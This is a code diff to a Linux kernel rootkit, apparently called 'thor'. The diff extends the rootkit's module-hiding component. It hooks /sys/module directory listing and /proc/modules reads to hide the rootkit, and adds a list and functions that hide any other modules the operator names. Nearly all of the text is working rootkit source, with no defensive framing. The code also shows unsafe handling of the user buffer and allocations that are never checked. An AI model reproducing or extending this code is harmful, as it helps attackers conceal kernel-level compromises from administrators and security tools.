@@ -20,6 +20,15 @@ static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
 
 ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off);
 
+/* hiding list node */
+struct _module_list {
+    char *name;
+    struct list_head list;
+};
+
+/* hiding list */
+static struct _module_list module_list;
+
 /* file operations on /sys/module */
 static struct file_operations *sysmodule_fops;
 
@@ -82,6 +91,8 @@ int lsmodhider_init(void)
     procmodules_fops->read = thor_procmodules_read;
     set_addr_ro(procmodules_fops);
 
+    INIT_LIST_HEAD(&module_list.list);
+
     return 0;
 }
 
@@ -116,33 +127,97 @@ static int thor_sysmodule_iterate(struct file *file, struct dir_context *ctx)
 static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type)
 {
+    struct _module_list *tmp;
+
+    /* hide thor */
     if (strcmp(name, THOR_MODULENAME) == 0) {
         return 0;
+    }
+
+    /* hide specified modules */
+    list_for_each_entry(tmp, &(module_list.list), list) {
+        if (strcmp(name, tmp->name) == 0) {
+            return 0;
+        }
     }
 
     return orig_sysmodule_filldir(buf, name, namelen, offset, ino, d_type);
 }
 
-ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off)
+void my_hide_module(char __user *buf, char *module, size_t *len, ssize_t *read_ret)
 {
-    ssize_t ret;
-    char *thor_occ;
+    char *module_occ;
 
-    ret = orig_procmodules_read(file, buf, len, off);
+    /* find and hide module from /proc/modules */
+    module_occ = strnstr(buf, module, *len);
 
-    /* find and hide thor from /proc/modules */
-    thor_occ = strnstr(buf, THOR_MODULENAME, len);
-
-    if (thor_occ != NULL) { /* thor found */
+    if (module_occ != NULL) { /* thor found */
         char *nl;
         /* find newline and copy the rest of the buffer over the thor
          * occurrence */
-        nl = strnstr(thor_occ, "\n", len - (thor_occ - buf));
-        memcpy(thor_occ, nl+1, len - ((nl + 1) - buf));
-        ret -= (nl+1 - thor_occ);
+        nl = strnstr(module_occ, "\n", *len - (module_occ - buf));
+        memcpy(module_occ, nl+1, *len - ((nl + 1) - buf));
+        *read_ret -= (nl+1 - module_occ);
+        *len -= (nl+1 - module_occ);
+    }
+}
+
+ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off)
+{
+    struct _module_list *tmp;
+    ssize_t ret;
+
+    ret = orig_procmodules_read(file, buf, len, off);
+
+    /* hide thor */
+    my_hide_module(buf, THOR_MODULENAME, &len, &ret);
+
+    /* hide specified modules */
+    list_for_each_entry(tmp, &(module_list.list), list) {
+        my_hide_module(buf, tmp->name, &len, &ret);
     }
 
     return ret;
+}
+
+void add_to_module_list(const char *name, unsigned int len)
+{
+    struct _module_list *tmp;
+
+    tmp = (struct _module_list*) kmalloc(sizeof(struct _module_list), GFP_KERNEL);
+    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
+    memcpy(tmp->name, name, len);
+    tmp->name[len - 1] = 0;
+
+    list_add(&(tmp->list), &(module_list.list));
+}
+
+void remove_from_module_list(const char *name, unsigned int len)
+{
+    struct _module_list *tmp;
+    struct list_head *pos, *q;
+
+    list_for_each_safe(pos, q, &(module_list.list)) {
+        tmp = list_entry(pos, struct _module_list, list);
+        if (strncmp(tmp->name, name, len - 1) == 0) {
+            list_del(pos);
+            kfree(tmp->name);
+            kfree(tmp);
+        }
+    }
+}
+
+void clear_module_list(void)
+{
+    struct _module_list *tmp;
+    struct list_head *pos, *q;
+
+    list_for_each_safe(pos, q, &(module_list.list)) {
+        tmp = list_entry(pos, struct _module_list, list);
+        list_del(pos);
+        kfree(tmp->name);
+        kfree(tmp);
+    }
 }
 
 void lsmodhider_cleanup(void)
@@ -162,5 +237,7 @@ void lsmodhider_cleanup(void)
         procmodules_fops->read = orig_procmodules_read;
         set_addr_ro(procmodules_fops);
     }
+
+    clear_module_list();
 }
 
